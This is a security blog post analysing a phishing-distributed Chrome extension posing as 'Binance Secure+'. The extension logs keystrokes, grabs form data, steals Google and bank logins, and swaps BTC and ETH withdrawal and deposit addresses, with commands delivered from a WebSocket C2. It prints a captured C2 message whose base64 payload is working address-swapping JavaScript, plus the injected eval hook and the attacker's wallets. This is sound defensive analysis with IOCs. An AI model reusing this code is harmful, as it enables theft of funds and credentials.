---
layout: post
title:  "BTC-ETH Stealer - Keylogger Chrome Extension Analysis"
subtitle: ""
date:   2020-05-23 04:20:05
categories: [Bitcoin, Ethereum, Stealer, Keylogger, Malware, CyberSecurity]
---

<p align="center">
  <img src="/assets/images/btc.jpg"/>
</p>

## Summary

I detected a phishing website of <a href="https://binance.com" target="_blank"> binance.com</a> which suggests the user to install the Chrome extension for better security. The extension claims to be an anti-phishing extension. By the time I analyzed it, it was still available in <a href="https://chrome.google.com/webstore/detail/binance-secure%2B/bmjmckjnidkfpfncinmhgkhdmhdbdgmh/" target="_blank"> store</a>. However the attacker steals BTC and ETH from users account by changing both the withdraw and deposit addresses with his own addresses dynamically. It targets the following websites:

- __binance.com__
- __coinbase.com__
- __localbitcoins.com__
- __blockchain.com__
- __bitvavo.com__
- __accounts.google.com__
- __credit-agricole.fr__

Additionally it has keylogger functionality and at every form submit operation it retrieves the submitted data and sends it to C2 over WebSocket.

## Analysis

Firstly I came up with the following domain:

- __https://kamehasuitens[.]info__

It redirect the user to the following URL:

- __https://jaxxx[.]io/be__

Then finally it redirects the user to:

- __https://xn--blnnce-yc8b[.]com/tr__

<p align="center">
  <img src="/assets/images/binance1.png"/>
</p>

</br>

The website seems like a phishing of binance.com, however when the user clicks on login or register it creates a pop-up with the following message:
```
To be the most secure and confidential exchange, we have introduced our new browser extension which acts as another layer of authentication. Using this extension, you can be sure that your account is safe. Please install this extension in order to continue using Binance.
```

<p align="center">
  <img src="/assets/images/binance2.png"/>
</p>

When clicked on the install button, the following extension link is opened in a new tab and the current tab is redirected to the original binance website. The extension was still available on web store on the date of analysis. 

- https://chrome.google.com/webstore/detail/binance-secure%2B/bmjmckjnidkfpfncinmhgkhdmhdbdgmh/

<p align="center">
  <img src="/assets/images/extension.png"/>
</p>

In the manifest.json of the extension we can see 2 suspicious JavaScript files. 

<p align="center">
  <img src="/assets/images/manifest.png"/>
</p>


In loading-overlay.js file there is an eventListener added to the window, which calls the chrome.runtime.sendMessage function with the data from event.

<p align="center">
  <img src="/assets/images/loading-overlay.png"/>
</p>

In background.js, it starts a WebSocket connection to C2:

- __ws://analytics.bege.ro:4367/__

It retrieves data from C2 as in the following format:

```
{"id":9,"pt":"*","e":"var e = document.createElement(\"script\");\n    e.innerHTML = 'window.kberohiowallet = {\"btc\":\"1Prg2M5SpLcZ4AJ68c1FqmiAN5aMDQg2ea\",\"eth\":\"0xD5214279EC68C0521E0Fa9347BD495099Bf59734\"}';\n    document.body.appendChild(e);\n    ","ps":true}

{"id":-1014800543,"pt":"binance.com","e":"var e = document.createElement(\"script\");\n          e.innerHTML = \"(function(){var identifier = -1014800543; window.kberohio = window.kberohio ? window.kberohio : {};if(window.kberohio.hasOwnProperty(identifier)){return;}else{window.kberohio[identifier] = true;} \"+atob(\"Cm9zZXRSZXF1ZXN0SGVhZGVyID0gWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLnNldFJlcXVlc3RIZWFkZXI7ClhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5zZXRSZXF1ZXN0SGVhZGVyID0gZnVuY3Rpb24oKXsKaWYoYXJndW1lbnRzWzBdID09ICJkZXZpY2UtaW5mbyIgJiYgYXJndW1lbnRzWzFdLmxlbmd0aCA+IDEwKXt3aW5kb3cuZGlzcGF0Y2hFdmVudChuZXcgQ3VzdG9tRXZlbnQoIm1tbW1tbW1tIiwge2RldGFpbDoge21vZDppZGVudGlmaWVyLGRldmljZWluZm86YXJndW1lbnRzWzFdfX0pKTt9CmlmKGFyZ3VtZW50c1swXSA9PSAiY3NyZnRva2VuIiAmJiBhcmd1bWVudHNbMV0ubGVuZ3RoID4gNSl7d2luZG93LmRpc3BhdGNoRXZlbnQobmV3IEN1c3RvbUV2ZW50KCJtbW1tbW1tbSIsIHtkZXRhaWw6IHttb2Q6aWRlbnRpZmllcixjc3JmdG9rZW46YXJndW1lbnRzWzFdfX0pKTt9CnJldHVybiBvc2V0UmVxdWVzdEhlYWRlci5hcHBseSh0aGlzLGFyZ3VtZW50cyk7Cn0KCnZhciByZWFkZXIgPSBuZXcgRmlsZVJlYWRlcigpOwpyZWFkZXIub25sb2FkID0gZnVuY3Rpb24oKSB7CgkJdHJ5ewoJICAgIHZhciBiYWxEYXRhID0gSlNPTi5wYXJzZShyZWFkZXIucmVzdWx0KTsKCQkJaWYoIWJhbERhdGEuc3VjY2VzcykKCQkJCXJldHVybjsKCQkJdmFyIHRvdGFsQnRjID0gMDsKCQkJZm9yKHZhciBpPTA7aTxiYWxEYXRhLmRhdGEubGVuZ3RoO2krKykKCQkJewoJCQkJdmFyIGNvaW4gPSBiYWxEYXRhLmRhdGFbaV07CgkJCQl0b3RhbEJ0YyArPSBjb2luLmJ0Y1ZhbHVhdGlvbjsKCQkJfQoJCQl3aW5kb3cuZGlzcGF0Y2hFdmVudChuZXcgQ3VzdG9tRXZlbnQoIm1tbW1tbW1tIiwge2RldGFpbDoge21vZDppZGVudGlmaWVyLHRvdGFsQnRjOnRvdGFsQnRjLnRvU3RyaW5nKCl9fSkpOwoJCX1jYXRjaChlKXt9Cn0KCm9PcGVuID0gWE1MSHR0cFJlcXVlc3QucHJvdG90eXBlLm9wZW47ClhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5vcGVuID0gZnVuY3Rpb24oKXt0aGlzLl91cmwgPSBhcmd1bWVudHNbMV07IHJldHVybiBvT3Blbi5hcHBseSh0aGlzLGFyZ3VtZW50cyk7fQpvU2VuZCA9IFhNTEh0dHBSZXF1ZXN0LnByb3RvdHlwZS5zZW5kOwpYTUxIdHRwUmVxdWVzdC5wcm90b3R5cGUuc2VuZCA9IGZ1bmN0aW9uKCl7Cgl0cnl7CgkJdmFyIG1zZyA9IEpTT04ucGFyc2UoYXJndW1lbnRzWzBdKTsKCQlpZih0aGlzLl91cmwubWF0Y2goJ2NhcGl0YWwvd2l0aGRyYXcvYXBwbHknKSkKCQl7CgkJCWlmKG1zZy5uZXR3b3JrID09ICdFVEgnKXttc2cuYWRkcmVzcyA9IHdpbmRvdy5rYmVyb2hpb3dhbGxldC5ldGg7fQoJCQllbHNlIGlmKG1zZy5uZXR3b3JrID09ICdCVEMnKXttc2cuYWRkcmVzcyA9IHdpbmRvdy5rYmVyb2hpb3dhbGxldC5idGM7fQoJCQlhcmd1bWVudHNbMF0gPSBKU09OLnN0cmluZ2lmeShtc2cpOwoJCX0KCQllbHNlIGlmKHRoaXMuX3VybC5tYXRjaCgnL3ByaXZhdGUvY2FwaXRhbC9jb25maWcvZ2V0QWxsJykpCgkJewoJCQl0aGlzLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCl7aWYgKHRoaXMucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7cmVhZGVyLnJlYWRBc1RleHQodGhpcy5yZXNwb25zZSk7fX0KCQl9Cgl9Y2F0Y2goZSl7fQoJcmV0dXJuIG9TZW5kLmFwcGx5KHRoaXMsYXJndW1lbnRzKTsKfQo=\")+\"})()\";\n          document.body.appendChild(e);","ps":true}
```

<p align="center">
  <img src="/assets/images/socket.png"/>
</p>


Each message has "pt" value which is either set to "\*" or a target website. If it is set to "\*" or the tab matches with the target website it is inserted to the document. Each message has "e" key, which contains JS that inserts new scripts to _document_. It sends the "e" part of the message with _chrome.tabs.sendMessage_. 

<p align="center">
  <img src="/assets/images/tabs.png"/>
</p>


And then the runtime.onMessage event is fired.

<p align="center">
  <img src="/assets/images/tabs2.png"/>
</p>


Then **catchException** function is called with e. After more detailed saerching I found that the attacked inserted **catchException** into jquery as follows:

```
catchException:function(c){eval(c)}
```

So the messages sent from C2 are evaluated. The first message I received was the following:

<p align="center">
  <img src="/assets/images/message1.png"/>
</p>

It contains the following cryptocoin addresses of attacker:

- "btc":"1Prg2M5SpLcZ4AJ68c1FqmiAN5aMDQg2ea"
- "eth":"0xD5214279EC68C0521E0Fa9347BD495099Bf59734"

When I run the extension, I got several messages from C2 containing JS. Those file were targeting the websites listed in the summary section. 

<p align="center">
  <img src="/assets/images/trafik.png"/>
</p>


#### Keylogger

This is not targeting a specific website, it runs all the time and collected data is sent to the C2 over the same WebSocket.

<p align="center">
  <img src="/assets/images/keylogger.png"/>
</p>

#### Form Grabber

This is also not targeting a specific website, collects every form data and sends them to C2.

<p align="center">
  <img src="/assets/images/formgrab.png"/>
</p>

#### CryptoCoins

One message is targeting **binance.com**. It intercepts AJAX requests to withdraw of binance and changes the addresses if it is BTC or ETH with the attackers own adresses. 

<p align="center">
  <img src="/assets/images/binance_withdraw.png"/>
</p>

It also tries to automatically confirm the withdrawal mail by retrieving every link on each tab and searches for the confirmation link. Once it finds the link, it confirms it by setting the window location to it.

It didn't send me a script to steal from **coinbase.com** at withdrawal but the message that contains the script to automatically confirm binance.com withdrawal mail also has a code block to hide withdrawal cancel option at **coinbase.com**.

<p align="center">
  <img src="/assets/images/binance_withdraw2.png"/>
</p>


It also makes signout/logout links hidden.

<p align="center">
  <img src="/assets/images/binance_withdraw3.png"/>
</p>


In **binance.com** attacker also interfere to the deposit stage by changing the addresses to deposit with its own wallet addresses.


<p align="center">
  <img src="/assets/images/binance_deposit.png"/>
</p>


For **localbitcoins.com** attacker also changes the bitcoin address with it's own bitcoin address.


<p align="center">
  <img src="/assets/images/localbitcoins1.png"/>
</p>


On the page **login.blockchain.com** attacker steals credentials.

<p align="center">
  <img src="/assets/images/blockchain.png"/>
</p>


On the **account.bitvavo.com** page, the attacker collects the portfolio summary.

<p align="center">
  <img src="/assets/images/bitvavo.png"/>
</p>


It also intercepts every AJAX request when the hostname is not **binance** and searches for strings in the same patter with a BTC address. Then, it replaces it with the attacker's own BTC address.


<p align="center">
  <img src="/assets/images/nonbinance.png"/>
</p>


On the **accounts.google.com** page, attacker steals the login credentials. As we can see below, there are two functions written for both click and enter options.

<p align="center">
  <img src="/assets/images/google.png"/>
</p>


On the **credit-agricole.fr** page, attacker steals identifier and personal code.


<p align="center">
  <img src="/assets/images/agricole.png"/>
</p>

<p align="center">
  <img src="/assets/images/agricole2.png"/>
</p>



## Conclusion and IOCs
The extension seems to be installed by **709** people so far and update date is **17 April** which means it has been in the store at least more than a month. Even though the BTC and ETH wallets stated in this post seems empty the attacker might be using multiple addresses. I believe the phishing URL address is sent to users with spam mails and SMSs. 


- https://kamehasuitens[.]info
- https://jaxxx[.]io/be
- https://xn--blnnce-yc8b[.]com/
- ws://analytics.bege[.]ro:4367/

- d98ecd03e9e83a06a292eefaafe622b2



Lastly thanks to <a href="https://github.com/sinantplgl" target="_blank">sinantplgl</a>